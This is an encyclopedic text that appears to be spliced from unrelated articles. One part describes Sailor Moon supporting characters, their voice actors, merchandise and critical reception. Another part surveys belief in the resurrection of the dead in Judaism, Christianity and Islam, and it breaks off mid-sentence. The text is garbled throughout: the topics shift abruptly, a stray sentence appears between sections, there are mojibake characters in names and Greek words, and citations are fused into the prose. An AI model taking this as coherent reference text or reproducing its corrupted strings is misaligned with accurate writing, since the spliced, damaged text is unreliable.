Silver Crystal. In the original Japanese series, Shingo was voiced by Chiyoko Kawashima until her retirement in 2001, with Seria Ry≈´ taking over the role afterward in Crystal. In the DIC/Cloverway English adaptation, he is voiced by Julie Lemieux. In the Viz Media English adaptation, his voice is supplied by Nicolas Roye. In the live-action series, he is portrayed by Naoki Takeshi. Naru Osaka is Usagi's best friend and schoolmate at the start of the series. Naru and her mother are the very first victims of a monster attack, and Naru hero-worships Sailor Moon for saving them. Throughout the series she continues to be a frequent target of villains and monsters. In a \\"memorable subplot\\" of the anime adaptation, Naru falls in love with Nephrite, who eventually returns her feelings and attempts to atone for his misdeeds. His death while protecting Naru devastates her throughout the first season. Voice actress Kotono Mitsuishi was particularly touched by this sequence. In the anime, Naru later dates Gurio Umino. Naru plays a much more important role in the live-action series, learning most of the truth about the Sailor Guardians. She is also a more confident and outgoing person. For a short while, she and Ami share a conflicted relationship as both seem to be jealous of the other's closeness with Usagi. However, they resolve their differences and become good friends. Naru's younger sister, Naruru, features in a short side-story in the Stars manga. In the anime it is stated that she is an only child.: Naru tells Usagi that even though she treats her childhood friend Rui Saionji like a sister, she is in fact an only child. Naruru at first appears with Haruka, Michiru, and Usagi at the high school and is shown getting along with them. Naru is voiced by Shino Kakinuma in the original series and by Satomi Sat≈ç in Crystal. In the DIC/Cloverway English versions, she is voiced by Mary Long in a heavy Brooklyn accent. In the Viz Media English version, she is voiced by Danielle Judovits. Chieko Ochi portrays her in the live-action series. Gurio Umino is a student in Usagi's class at school. He is usually called simply Umino, and begins with a severe infatuation with Usagi. His defining characteristic is his glasses, which are drawn with swirls denoting their thickness. Umino is commonly portrayed as a \\"nerdy\\", \\"weird\\", and \\"know-it-all\\" otaku, regularly keeping Usagi informed on current events, new students, gossip, and any other information she might appreciate. Despite his ordinarily nerdy appearance, Umino is implied (and later confirmed by Takeuchi) to be \\"relatively handsome\\". In the first anime, he develops a relationship with Naru, and their importance gradually decreases after the first anime series. The kanji in Umino's surname represent a pun meaning either \\"ocean field\\" or \\"of ocean\\"; as such, it is constructed in the same way as Usagi's and those of other Sailor Guardians. In the Japanese series, his voice actor is Keiichi Nanba in Sailor Moon and Daiki Yamashita in Crystal. In the DIC/Cloverway English adaptation, he is voiced by Roland Parliament. In the Viz Media English adaptation, his voice is supplied by Ben Diskin. Haruna Sakurada is a junior high school teacher who often lectures Usagi for her laziness. Haruna intends to find a husband, which makes her an easy target for the Dark Kingdom during the first arc, and she often engages in seemingly childish things in this regard. She appears less frequently as the series progresses, and is never seen after Usagi and her friends start high school. In the live-action series, Haruna assigns pop quizzes and clean-up duty when needed. She has an extremely eccentric personality, and is very friendly and motherly towards her students, even Usagi. The kanji in her name mean \\"cherry blossom\\" (sakura), \\"rice field\\" (da), \\"spring\\" (haru), and \\"vegetables\\" (na). The \\"spring\\" part of her name becomes a pun in the context of other works by Takeuchi: Haruna appears very briefly in one earlier series, The Cherry Project, which features her sister Fuyuna in one of its side stories. Two other characters with similar names appear in Takeuchi works: Natsuna in Codename: Sailor V and Akina in PQ Angels. The Japanese words fuyu, natsu, and aki mean \\"winter\\", \\"summer\\", and \\"autumn\\", respectively. In the Japanese series, Haruna was originally voiced by Chiyoko Kawashima in Sailor Moon until her retirement in 2001. Akemi Kanda voices her from Crystal onwards. In the DIC English adaptation, she is voiced by Nadine Rabinovitch. In the Viz Media English adaptation, her voice is supplied by Julie Ann Taylor. She is played by Tomoko Otakara in the live- action series. In the musicals, Haruna is portrayed at various points by Kasumi Hyuga and Kiho Seishi. Motoki Furuhata works at the Crown Game Center, a video arcade Usagi frequently visits. Motoki also holds a job at the Crown Fruit Parlor and is a KO University student along with Mamoru Chiba. After he recognizes the Sailor Guardians and learns their true identities, Motoki vows not to tell anyone. In the anime adaptation, Usagi calls him and has a crush on him in the beginning of the series. Motoki and Mamoru also attend the Azabu Institute of Technology. He is pretty naive, and says that he views the girls as younger sisters, oblivious to the fact that they have crushes on him. He has a little sister, Unazuki Furuhata, who is friends with Usagi and the others. His girlfriend is Reika Nishimura, a science student. It is gradually revealed that he and Reika knew Setsuna while she was studying at their university. In the continuity of Sailor Moon Crystal, Motoki's background is the same, but he does not know Mamoru, who is still a high school student. In the live-action series, the Crown Center is a karaoke parlor. There is an initial recurring flirtatious relationship between Motoki and Makoto until it becomes a bit more serious, and in the Special Act, which takes place four years after the series finale, Motoki proposes to Makoto, who accepts.

Kotono is also Kyusuke Sarashina's elder sister, and made a Sailor V button for her brother.

Princess Kakyuu is the princess of Kinmoku (which is named for kinmokusei, the Japanese name for the Osmanthus fragrans (the Sweet Osmanthus) fruiting plant), a fictional planet outside of the Solar System that is also the home of the Sailor Starlights, who are Kakyuu's protectors and spend much of the story searching for her. Kinmoku is attacked and destroyed by Sailor Galaxia, while Kakyuu is injured during the battle. She cannot reveal herself until her wounds are healed, and the Starlights lose contact with her. She travels to Earth because she senses the birth of the Silver Crystal, and hides in a censer that is guarded by Chibi-Chibi. She has her own Guardian form, Sailor Kakyuu, and later reveals to Sailor Moon that her own lover had died in the war against Galaxia. Kakyuu eventually reunites with the Starlights and accompanies Sailor Moon to Zero Star Sagittarius to confront Galaxia, but is mortally wounded by Sailor Chi. She dies in Sailor Moon's arms, saying that she wants to be reborn, maybe in a world without war, but at the very least to be with everyone again. In the manga, Kakyuu had a lover who was killed by Galaxia. In the anime adaptation, Kakyuu goes to Earth to locate the \\"Light of Hope\\" and to hide from Galaxia. During her time under Chibi-Chibi's care, she is aware of the Starlights searching for her, but cannot reveal herself too soon. She eventually saves Sailor Moon and the others from a black hole and resumes leadership of the Starlights. However, after Kakyuu is found, Galaxia steals her Star Seed, killing her. After Sailor Moon defeats Chaos, Kakyuu is revived. She and the Starlights return to Kinmoku to rebuild and start over. Her Sailor Guardian form is never shown in this adaptation. In the original Japanese series, her voice actress is Sakiko Tamagawa. In the English dub, she is voiced by Allegra Clark. In the musical version, Princess Kakyuu is portrayed by Sakoto Yoshioka, Ai Toyama, and Asami Okamura. Chibi- Chibi first appears in Act 44 of the manga and episode 182 of the anime. She appears to be a very young child and imitates the ends of others' sentences, mostly saying \\"chibi\\". Her red-pink hair is always up in two heart shaped odango with little ringlets sticking out the sides, echoing Usagi's hairstyle. Chibi-Chibi's name is a doubling of the Japanese term meaning \\"small person\\" or \\"small child\\" and is used both for that reason and because of Chibi-Chibi's similarity to Chibiusa. It is also a pun, as the word Chibi- Chibi means \\"making something last\\". Chibi-Chibi is first shown floating down to Earth with an umbrella in her hand and shows up at the Tsukino house. In the anime, she first meets Usagi in the park one afternoon and starts to follow her around, saying only \\"chibi chibi\\" without having been prompted. Chibi-Chibi attaches herself to Usagi's family, whose memories are modified so that they believe her to be the youngest child of the family ‚Äì almost exactly what Chibiusa had done on her first appearance.The only difference is that Chibiusa made them think she was Usagi's cousin instead of her younger sister. Chibi-Chibi is the caretaker of a small ornate censer in which Princess Kakyuu is resting, hidden from the evil Sailor Galaxia. Chibi-Chibi eventually transforms, under her own power, into a Sailor Guardian called Sailor Chibi- Chibi. In her Sailor Guardian form, she carries a heart scepter and uses it to defend herself and Sailor Moon, but is not shown using any attack of her own. Chibi-Chibi's childlike form is a disguise for Sailor Cosmos, a powerful Sailor Guardian who is the future version of Sailor Moon. In the anime, Chibi- Chibi is Galaxia's Star Seed, who had once been a great force for good. When Galaxia fought Chaos, she could see no way to defeat it except to seal it away inside her own body. In order to protect her Star Seed from being corrupted, she sent it away to Earth, where it became Chibi-Chibi. Chibi-Chibi is referred to as the \\"light of hope\\" (kib≈ç no hikari) by the Starlights; their one chance for defeating Galaxia. In the end, Chibi-Chibi transforms herself into the Sword of Sealing (fuuin no ken), the weapon Galaxia had used to seal away Chaos, and Chibi-Chibi begs Sailor Moon to use it to defeat them. During the battle, Galaxia shatters the sword, killing Chibi-Chibi. However, Chibi- Chibi is revived along with all the other fallen Sailor Guardians after Sailor Moon cleanses Galaxia of Chaos. In the anime series, Chibi-Chibi is voiced by Kotono Mitsuishi in Japanese, and by Stephanie Sheh in English. In the stage musicals, Chibi-Chibi has been played by Mao Kawasaki, Mikiko Asuke, Yuka Gouchou, and Mina Horita. Takeuchi praised Kawasaki's cuteness as Chibi-Chibi. When she appears in the stage musicals, Chibi-Chibi's backstory always follows the anime version. She is given her own song, \\"Mou ii no\\" (), which she sings to announce that she has come to rejoin Galaxia. =Sailor Cosmos= is the ultimate future form of Sailor Moon. She comes from a future which has been destroyed by the battle with Sailor Chaos; after ages of fighting, she despairs and flees to the past as the infant Chibi-Chibi to encourage Sailor Moon to defeat Chaos in the final battle of the series. At first, she wants Sailor Moon to destroy the Galaxy Cauldron altogether, ensuring Chaos' destruction, but Sailor Moon protests, realizing that if the Cauldron is destroyed no more stars will be born, leaving the Galaxy without a future. Sailor Moon chooses to sacrifice herself to the Cauldron and seal Chaos away, which Cosmos realizes to have been the right decision. Reminded of the strength and courage she herself needs to have, Sailor Cosmos returns to the future with new hope. After the end of the anime adaptation, Takeuchi commented that she wished Sailor Cosmos had been used in Sailor Moon Sailor Stars. In the musicals, Sailor Cosmos is played by Satomi Okubo, who played Usagi Tsukino/Sailor Moon between 2013 and 2015. Merchandise Differences in character between the Sailor Guardians mirror differences in their hairstyles, fashion, and magical items, which has translated well into doll lines. Sales of the Sailor Guardians fashion dolls overtook those of Licca- chan in the 1990s. Mattel attributed this to the \\"fashion-action\\" blend of the Sailor Moon storyline; doll accessories included both fashion items and the Guardian's weapons. The first line of dolls included Queen Beryl, the first major antagonist of the series, a decision that was described as a \\"radical idea\\". Bandai introduced a line of little dolls that included the Amazoness Quartet and, according to Takeuchi, these were their favorite because \\"with their costumes and faithfulness to the originals, the dolls really excelled.\\" Bandai has released several S.H. Figuarts based on the characters' appearances from the first anime adaptation. Among those figures are the Sailor Guardians, Tuxedo Mask, and Black Lady. In early 2014, Megahouse released a set of trading figures consisting of twelve figurines, two for each Sailor Guardian and two for Tuxedo Mask. Several characters, including Sailor Guardians, villains, supporting characters, and monsters of the day are featured in a collectible card game which was released in 2000 by Dart Flipcards. A collaboration between Sailor Moon and Capcom took place in March 2018 as part of the 25th anniversary celebration of the Sailor Moon franchise. In this collaboration, the Felyne cat companion resembles Luna and wields Usagi's Cutie Moon Rod weapon in the Monster Hunter XX expansion of Monster Hunter Generations. Reception The Sailor Guardian uniform is a popular choice for male-to-female crossplayers, creating \\"humorous effect and social levity\\" at conventions. Here, a group of males dressed as Sailor Moon and the Sailor Guardians strike a pose from the Ginyu Force of Dragon Ball. Sailor Moon has been described largely in terms of its characters; a sustained 18-volume narrative about a group of young heroines who are simultaneously heroic and introspective, active and emotional, dutiful and ambitious. The combination proved extremely successful, and Sailor Moon became internationally popular in both manga and anime formats. The function of the Sailor Guardians themselves has been analyzed by critics, often in terms of feminist theory. Susan J. Napier described the Sailor Guardians as \\"powerful, yet childlike\\", and suggested that this is because Sailor Moon is aimed towards an audience of young girls. She stated that the Sailor Guardians readily accept their powers and destinies and do not agonize over them, which can be read as an expression of power and success. The Sailor Guardians have been described as merging male and female traits, being both desirable and powerful. As sexualized teen heroines, they are significantly different from the sexless representation of 1980s teen heroines such as Nausica√§. Anne Allison noted that the use of the sailor fuku as a costume makes it easy for girls to identify with the Sailor Guardians, but also for older males to see them as sex symbols. Unlike the female Power Rangers, who as the series go on become more unisex in both costume and poses, the Sailor Guardians' costumes become frillier and more \\"feminine\\". Mary Grigsby considered that the Sailor Guardians blend ancient characteristics and symbols of femininity with modern ideas, reminding the audience of a pre-modern time when females were equal to males, but other critics drew parallels with the modern character type of the aggressive cyborg woman, pointing out that the Sailor Guardians are augmented by their magical equipment. Much of the Sailor Guardians' strength stems from their reliance and friendship with other girls rather than from men. Kazuko Minomiya has described the daily lives of the girls within the series as risoukyou, or \\"utopic\\". They are shown as enjoying many leisure activities such as shopping, visiting amusement parks, and hanging out at the Crown Arcade. According to Allison, Minomiya points out that the depiction of life is harder and more serious for male superheroes. The characters \\"double\\" as ordinary girls and as \\"celestially-empowered superheroes\\". The \\"highly stylized\\" transformation that the Sailor Guardians go through has been said to \\"symbolically separate\\" the negative aspects of the characters (laziness, for example) and the positive aspects of the superheroine, and gives each girl her unique uniform and \\"a set of individual powers\\". Some commentators have read the transformation of the Sailor Guardians as symbolic of puberty, as cosmetics appear on the Guardians and their uniforms highlight cleavages, slim waists, and long legs, which \\"outright force the pun on heavenly bodies\\". Jason Thompson found the Sailor Moon anime reinvigorated the magical girl genre by adding dynamic heroines and action-oriented plots. Following its success, similar series, such Magic Knight Rayearth, Wedding Peach, Nurse Angel Ririka SOS, Revolutionary Girl Utena, Fushigi Yuugi and Pretty Cure, emerged.

Various forms of this concept can be found in Bahai, Christian, Islamic, Jewish and Zoroastrian eschatology. Rabbinic and Samaritan Judaism Resurrection of the Dead, fresco from the Dura-Europos synagogue Ezekiel's Vision of the Valley of Dry Bones, engraving by Gustave Dor√© (1866) There are three explicit examples in the Hebrew Bible of people being resurrected from the dead: * The prophet Elijah prays and God raises a young boy from death (1 Kings 17:17‚Äì24) * Elisha raises the son of the Shunammite woman (2 Kings 4:32‚Äì37); this was the very same child whose birth he previously foretold (2 Kings 4:8‚Äì16) * A dead man's body that was thrown into the dead Elisha's tomb is resurrected when the body touches Elisha's bones (2 Kings 13:21) While there was no belief in personal afterlife with reward or punishment in Judaism before 200 BC, in later Judaism and Samaritanism it is believed that the God of Israel will one day give te·∏•iyyat ha-metim (\\"life to the dead\\") to the righteous during the Messianic Age, and they will live forever in the world to come (Olam Ha-Ba). Jews today base this belief on the Book of Isaiah (Yeshayahu), Book of Ezekiel (Ye·∏•ez'qel), and Book of Daniel (Dani'el). Samaritans base it solely on a passage called the Haazinu in the Samaritan Pentateuch, since they accept only the Torah and reject the rest of the Hebrew Bible. During the Second Temple period, Judaism developed a diversity of beliefs concerning the resurrection. The concept of resurrection of the physical body is found in 2 Maccabees, according to which it will happen through recreation of the flesh.2 Maccabees 7.11, 7.28. Resurrection of the dead also appears in detail in the extra- canonical books of Enoch,1 Enoch 61.5, 61.2. in the Apocalypse of Baruch,2 Baruch 50.2, 51.5 and 2 Esdras. According to the British scholar in ancient Judaism Philip R. Davies, there is \\"little or no clear reference ... either to immortality or to resurrection from the dead\\" in the Dead Sea scrolls texts.Philip R. Davies. \\"Death, Resurrection and Life After Death in the Qumran Scrolls\\" in Alan J. Avery-Peck & Jacob Neusner (eds.)

Both Josephus and the New Testament record that the Sadducees did not believe in an afterlife,Josephus Antiquities 18.16; Matthew 22.23; Mark 12.18; Luke 20.27; Acts 23.8. but the sources vary on the beliefs of the Pharisees. The New Testament claims that the Pharisees believed in the resurrection, but does not specify whether this included the flesh or not.Acts 23.8. According to Josephus, who himself was a Pharisee, the Pharisees held that only the soul was immortal and the souls of good people will be reincarnated and \\"pass into other bodies,\\" while \\"the souls of the wicked will suffer eternal punishment.\\"Josephus Jewish War 2.8.14; cf.

Jewish halakhic authority Maimonides set down his Thirteen Articles of Faith which have ever since been printed in all Rabbinic Siddur (prayer books). Resurrection is the thirteenth principle: \\"I firmly believe that there will take place a revival of the dead at a time which will please the Creator, blessed be His name.\\"David Birnbaum, Jews, Church & Civilization, Volume III (Millennium Education Foundation 2005), p. 157 Modern Orthodox Judaism holds belief in the resurrection of the dead to be one of the cardinal principles of Rabbinic Judaism. Harry Sysling, in his 1996 study of Te·∏•iyyat Ha-Metim in the Palestinian Targumim, identifies a consistent usage of the term \\"second death\\" in texts from the Second Temple period and early rabbinical writings, but not in the Hebrew Bible. \\"Second death\\" is identified with judgment, followed by resurrection from Gehinnom (\\"Gehenna\\") at the Last Day.Harry Sysling, Te·∏•iyyat ha-metim: the resurrection of the dead in the Palestinian Targums (1996), p. 222: \\"Here the second death is identical with the judgment in Gehinnom.

In verses 54‚Äì55, Paul the Apostle is conveyed as quoting from the Book of Hosea 13:14 where he speaks of the abolition of death. In the Pauline epistles of the New Testament, Paul the Apostle wrote that those who will be resurrected to eternal life will be resurrected with spiritual bodies, which are imperishable; the \\"flesh and blood\\" of natural, perishable bodies cannot inherit the kingdom of God, and, likewise, those that are corruptible will not receive incorruption (1 Corinthians 15:35‚Äì54). Even though Paul does not explicitly establish that immortality excludes physical bodies, some scholars understand that according to Paul, flesh is simply to play no part, as people are made immortal.Archibald Robertson & Alfred Plummer.

New York 1995:6. = Gospels and Acts = The Gospel of Matthew has Jesus famously teach/preach for the first time in 4:17, \\"Repent, for the kingdom of heaven is at hand.\\" Matthew 6:19-21. It introduces the expression ·ºÄŒΩŒ±œÉœÑŒ¨œÉŒµœâœÇ œÑ·ø∂ŒΩ ŒΩŒµŒ∫œÅ·ø∂ŒΩ, which is used in a monologue by Jesus who speaks to the crowds about \\"the resurrection\\" called simply ·øá ·ºÄŒΩŒ±œÉœÑŒ¨œÉŒµŒπ (Mat. 22:29‚Äì33). This type of resurrection refers to the raising up of the dead, all mankind, at the end of this present age, the general or universal resurrection. In the canonical gospels, the resurrection of Jesus is described as a resurrection of the flesh: from the empty tomb in Mark; the women embracing the feet of the resurrected Jesus in Matthew; the insistence of the resurrected Jesus in Luke that he is of \\"flesh and bones\\" and not just a spirit or pneuma; to the resurrected Jesus encouraging the disciples to touch his wounds in John. In Acts of the Apostles the expression ·ºÄŒΩŒ±œÉœÑŒ¨œÉŒµœâœÇ ŒΩŒµŒ∫œÅ·ø∂ŒΩ was used by the Apostles and Paul the Apostle to defend the doctrine of the resurrection. Paul brought up the resurrection in his trial before Ananias ben Nedebaios. The expression was variously used in reference to a general resurrection (Acts 24:21) at the end of this present age (Acts 23:6, 24:15). in the King James Version reads: \\"... there shall be a resurrection of the dead, both of the just and unjust.\\" =Nicene Creed and early Christianity= Resurrection of the Flesh (c. 1500) by Luca Signorelli ‚Äì based on 1 Corinthians 15: 52: \\"the trumpet shall sound, and the dead shall be raised incorruptible, and we shall be changed.\\" Chapel of San Brizio, Duomo, Orvieto. Most Christian denominations profess the Nicene Creed, which affirms the resurrection of the dead; most English versions of the Nicene Creed in current use include the phrase: \\"We look for the resurrection of the dead, and the life of the world to come.\\" The Christian writers Irenaeus and Justin Martyr, in the 2nd century, wrote against the idea that only the soul survived. (The word \\"soul\\" is unknown in the Aramaic; it entered Christian theology through the Greek.Exegetical Dictionary of the New Testament) Justin Martyr insists that a man is both soul and body and Christ has promised to raise both, just as his own body was raised. The Christian doctrine of resurrection is based on Christ's resurrection. There was no ancient Greek belief in a general resurrection of the dead. Indeed, they held that once a body had been destroyed, there was no possibility of returning to life as not even the gods could recreate the flesh. Several early Church Fathers, like Pseudo-Justin, Justin Martyr, Tatian, Irenaeus, and Athenagoras of Athens argue about the Christian resurrection beliefs in ways that answer to this traditional Greek scepticism to post-mortal physical continuity. The human body could not be annihilated, only dissolved ‚Äì it could not even be integrated in the bodies of those who devoured it. Thus God only had to reassemble the minute parts of the dissolved bodies in the resurrection. Traditional Christian Churches, i.e. ones that adhere to the creeds, continue to uphold the belief that there will be a general and universal resurrection of the dead at \\"the end of time\\", as described by Paul when he said: \\"He hath appointed a day, in which he will [judge the world\\" (Acts 17:31 KJV) and \\"There shall be a resurrection of the dead, both of the just and unjust\\" (Acts 24:15 KJV). =Modern Era= Early Christian church fathers defended the resurrection of the dead against the pagan belief that the immortal soul went to the underworld immediately after death. Currently, however, it is a popular Christian belief that the souls of the righteous go to Heaven.Will We Be Reunited with Children Who Have Died? At the close of the medieval period, the modern era brought a shift in Christian thinking from an emphasis on the resurrection of the body back to the immortality of the soul.Encyclopedia of Christian Theology Vol. 3, \\"Resurrection of the Dead\\" by Andr√© Dartigues, ed. by Jean-Yves Lacoste (New York: Routledge, 2005), 1381. This shift was a result of a change in the zeitgeist, as a reaction to the Renaissance and later to the Enlightenment. Andr√© Dartigues has observed that especially \\"from the 17th to the 19th century, the language of popular piety no longer evoked the resurrection of the soul but everlasting life. Although theological textbooks still mentioned resurrection, they dealt with it as a speculative question more than as an existential problem.\\" This shift was supported not by any scripture, but largely by the popular religion of the Enlightenment, deism. Deism allowed for a supreme being, such as the philosophical first cause, but denied any significant personal or relational interaction with this figure. Deism, which was largely led by rationality and reason, could allow a belief in the immortality of the soul, but not necessarily in the resurrection of the dead. American deist Ethan Allen demonstrates this thinking in his work, Reason the Only Oracle of Man (1784) where he argues in the preface that nearly every philosophical problem is beyond humanity's understanding, including the miracles of Christianity, although he does allow for the immortality of an immaterial soul.The Encyclopedia of Unbelief, Vol. 1, A‚ÄìK, \\"Deism,\\" Edited by Gordon Stein (Buffalo, NY: Prometheus Books, 1985), 134. =Influence on secular law and custom= In Christian theology, it was once widely believed that to rise on Judgment Day the body had to be whole and preferably buried with the feet to the east so that the person would rise facing God.Barbara Yorke (2006), The Conversion of Britain Pearson Education, , . p. 215Essex, Massachusetts ‚Äì Cemetery: The Old Burying Ground, Essex, Mass.I.

Little was known about anatomy and medical schools were very keen to get their hands on dead bodies that they could dissect.\\" Restricting the supply to the cadavers of murderers was seen as an extra punishment for the crime. If one believes dismemberment stopped the possibility of resurrection of an intact body on judgment day, then a posthumous execution is an effective way of punishing a criminal.Miriam Shergold and Jonathan GrantThe evolution of regulations for health research in England(pdf) Prepared for the Department of Health, February 2006.

For much of the British population it was not until the 20th century that the link between the body and resurrection was finally broken as cremation was only made legal in 1902. =Denominational views= In Catholicism, Augustine of Hippo believed in a universal resurrection of bodies for all immortal souls.Aurelius Augustinus, City of God Against the Pagans \\"For then, either not all the dead will rise, leaving some human souls without bodies forever, that had once had human bodies, though only in their mother's womb; or if all human souls are to receive in the resurrection the bodies which ...\\" According to the Catholic Encyclopedia: \\"No doctrine of the Christian Faith\\", says St. Augustine, \\"is so vehemently and so obstinately opposed as the doctrine of the resurrection of the flesh.\\" This opposition had begun long before the days of St. Augustine.\\" According to the Summa Theologica, spiritual beings that have been restored to glorified bodies will have the following basic qualities: * Impassibility (incorruptible / painless) ‚Äì immunity from death and pain * Subtility (permeability) ‚Äì freedom from restraint by matter * Agility ‚Äì obedience to spirit with relation to movement and space (the ability to move through space and time with the speed of thought) * Clarity ‚Äì resplendent beauty of the spirit manifested in the body (as when Jesus was transfigured on Mount Tabor)The Catholic Catechism by Father John A. Hardon, p. 265 According to the Catholic Encyclopedia (1911) article on \\"General resurrection\\" \\"The Fourth Lateran Council (1215) teaches that all men, whether elect or reprobate, \\"will rise again with their own bodies which they now bear about with them\\" (chapter \\"Firmiter\\"). In the language of the creeds and professions of faith this return to life is called resurrection of the body (resurrectio carnis, resurrectio mortuorum, anastasis ton nekron) for a double reason: first, since the soul cannot die, it cannot be said to return to life; second the heretical contention of Hymeneus and Philitus that the Scriptures denote by resurrection not the return to life of the body, but the rising of the soul from the death of sin to the life of grace, must be excluded.\\" The Catechism of the Catholic Church says: In Anglicanism, scholars such as the Bishop of Durham N. T. Wright, have defended the primacy of the resurrection in Christian faith. Interviewed by Time in 2008, senior Anglican bishop and theologian N. T. Wright spoke of \\"the idea of bodily resurrection that people deny when they talk about their 'souls going to Heaven,'\\" adding: \\"I've often heard people say, 'I'm going to heaven soon, and I won't need this stupid body there, thank goodness.' That's a very damaging distortion, all the more so for being unintentional.\\" Instead, Wright explains: \\"In the Bible we are told that you die, and enter an intermediate state.\\" This is \\"conscious,\\" but \\"compared to being bodily alive, it will be like being asleep.\\" This will be followed by resurrection into new bodies, he says. \\"Our culture is very interested in life after death, but the New Testament is much more interested in what I've called the life after life after death.\\" Among the original Forty-Two Articles of the Church of England, one read: \\"The resurrection of the dead is not as yet brought to pass, as though it only belonged to the soul, which by the grace of Christ is raised from the death of sin, but it is to be looked for at the last day; for then (as Scripture doth most manifestly testify) to all that be dead their own bodies, flesh and bone shall be restored, that the whole man may (according to his works) have other reward or punishment, as he hath lived virtuously, or wickedly.\\" Of Baptists, James Leo Garrett Jr., E. Glenn Hinson, and James E. Tull write that \\"Baptists traditionally have held firmly to the belief that Christ rose triumphant over death, sin, and hell in a bodily resurrection from the dead.\\" In Lutheranism, Martin Luther personally believed and taught resurrection of the dead in combination with soul sleep. However, this is not a mainstream teaching of Lutheranism and most Lutherans traditionally believe in resurrection of the body in combination with the immortal soul.Evangelical Lutheran intelligencer: Volume 5‚Äì1830 Page 9 Evangelical Lutheran Synod of Maryland and Virginia \\"Every one of those committed to our care is possessed of an immortal soul and should we not exceedingly rejoice, that we in the hands of the Supreme Being, may be instrumental in leading them unto 'fountains of living water'.\\" According to the Lutheran Church‚ÄìMissouri Synod (LCMS), on the last day all the dead will be resurrected. Their souls will then be reunited with the same bodies they had before dying. The bodies will then be changed, those of the wicked to a state of everlasting shame and torment, those of the righteous to an everlasting state of celestial glory. In Methodism, the Reverend M. Douglas Meeks, professor of theology and Wesleyan studies at Vanderbilt Divinity School, states that \\"it is very important for Christians to hold to the resurrection of the body.\\" F. Belton Joyner in United Methodist Answers, states that the \\"New Testament does not speak of a natural immortality of the soul, as if we never actually die. It speaks of resurrection of the body, the claim that is made each time we state the historic Apostles' Creed and classic Nicene Creed,\\" given in The United Methodist Hymnal. In ¬∂128 of the Book of Discipline of the Free Methodist Church it is written: \\"There will be a bodily resurrection from the dead of both the just and the unjust, they that have done good unto the resurrection of life, they that have done evil unto the resurrection of the damnation. The resurrected body will be a spiritual body, but the person will be whole identifiable. The Resurrection of Christ is the guarantee of resurrection unto life to those who are in Him.\\" John Wesley, the founder of the Methodist Church, in his sermon On the Resurrection of the Dead, defended the doctrine, stating \\"There are many places of Scripture that plainly declare it. St. Paul, in the 53d verse of this chapter, tells us that 'this corruptible must put on incorruption, and this mortal must put on immortality.' [1 Corinthians 15:53].\\" In addition, notable Methodist hymns, such as those by Charles Wesley, link 'our resurrection and Christ's resurrection\\". In Christian conditionalism, there are several churches, such as the Anabaptists and Socinians of the Reformation, then Seventh-day Adventist Church, Christadelphians, Jehovah's Witnesses, and theologians of different traditions who reject the idea of the immortality of a non-physical soul as a vestige of Neoplatonism, and other pagan traditions. In this school of thought, the dead remain dead (and do not immediately progress to a Heaven, Hell, or Purgatory) until a physical resurrection of some or all of the dead occurs at the end of time, or in Paradise restored on earth, in a general resurrection. Some groups, Christadelphians in particular, consider that it is not a universal resurrection, and that at this time of resurrection that the Last Judgment will take place.Michael Ashton. Raised to Judgement Bible Teaching about Resurrection & Judgement Christadelphian, Birmingham 1991 The first-century treatise Didache comments 'Not the resurrection of everyone, but, as it says, \\"The Lord will come and all his holy ones with him\\" (16.7)Simon Tugwell The apostolic Fathers 1990 p. 148 \\"First, the mention of the resurrection is qualified by the rider, 'Not the resurrection of everyone, but, as it says, \\"The Lord will come and all his holy ones with him\\" (16.7). This is probably to be taken, not as meaning that dead sinners never get resurrected, but as referring to a preliminary resurrection of the saints before the millennial earthly reign of Christ, which was widely believed in the early\\" Many Evangelicals believe in a universal resurrection, but divided into two separate resurrections; at the Second Coming and then again at the Great White Throne.Herbert Lockyer All about the Second Coming 1998 p. xv \\"Only some of the dead will rise: ‚Äúthe dead in Christ will rise first‚Äù(1 Thessalonians 4:16). The rest of the dead, the wicked dead, will remain in their graves until the time of the great white throne, when all must be raised\\" The Doctrinal Basis of the Evangelical Alliance affirms belief in \\"the resurrection of the body, the judgment of the world by our Lord Jesus Christ, with the eternal blessedness of the righteous, and the eternal punishment of the wicked.\\" Latter Day Saints believe that God has a plan of salvation. Before the resurrection, the spirits of the dead are believed to exist in a place known as the spirit world, which is similar to, yet fundamentally distinct from, the traditional concept of Heaven and Hell. It is believed that the spirit retains its wants, beliefs, and desires in the afterlife.LDS Church Chapter 41: The Postmortal Spirit World LDS Church doctrine teaches that Jesus Christ was the first person to be resurrected, and that all those who have lived on the earth will be resurrected because of Jesus Christ, regardless of their righteousness. The LDS Church teaches that not all are resurrected at the same time; the righteous will be resurrected in a \\"first resurrection\\" and unrepentant sinners in a \\"last resurrection.\\" The resurrection is believed to unite the spirit with the body again, and the LDS Church teaches that the body (flesh and bone) will be made whole and become incorruptible, a state which includes immortality. There is also a belief in LDS doctrine that a few exceptional individuals were removed from the earth \\"without tasting of death.\\" This is referred to as translation, and these individuals are believed to have retained their bodies in a purified form, though they too will eventually be required to receive resurrection.LDS Church Translated Beings Some millennialists interpret the Book of Revelation as requiring two physical resurrections of the dead, one before the Millennium, the other after it.Ben Witherington Revelation p291 2003 \\"In short John affirms two resurrections of the dead: one is blessed, the other not blessed; one is before the millennium, the other after it.5 It is then proper to conclude that John believes in a future millennial reign upon the earth.\\" Mortalists, those Christians who do not believe that humans have immortal souls, may believe in a universal resurrection, such as Martin Luther,Paul Althaus The theology of Martin Luther 1966 \\"With the New Testament, Luther teaches the resurrection of all the dead and not only of the believers.\\" All enter into judgment. The believers enter into eternal life with Christ; evil men enter into eternal death with the devil and his angels.\\"\\" and Thomas Hobbes in Leviathan.Hobbes Leviathan 1976 ed., p.315 \\"For though the Scripture be clear for a universal resurrection, yet we do not read that to any of the reprobate is promised an eternal life. For whereas St. Paul, to the question concerning what bodies men shall rise with again,\\" Some mortalist denominations may believe in a universal resurrection of all the dead, but in two resurrection events, one at either end of a millennium, such as Seventh-day Adventists.Seventh-Day Adventists answer questions on doctrine General Conference of Seventh-Day Adventists ‚Äì 1957 \\"The general resurrection of all the dead occurs at the second advent, which will usher in the eternal world. Satan was \\"bound\\" by the first advent of our Lord, and expelled from the individual hearts of His followers\\" Other mortalist denominations deny a universal resurrection, such as ChristadelphiansTennant, H. Christadelphians ‚Äì What they believe and teach Birmingham, CMPA 1977 and hold that the dead count three groups; the majority who will never be raised, those raised to condemnation, and a second final destruction in the \\"Second Death\\", and those raised to eternal life. Islam In Islam, Yawm al-QiyƒÅmah ( \\"the Day of Resurrection\\") or Yawm ad-Din ( \\"the Day of Judgment\\") is believed to be God's final assessment of humanity. The sequence of events (according to the most commonly held belief) is the annihilation of all creatures, resurrection of the body, and the judgment of all sentient creatures. The exact time when these events will occur is unknown, however there are 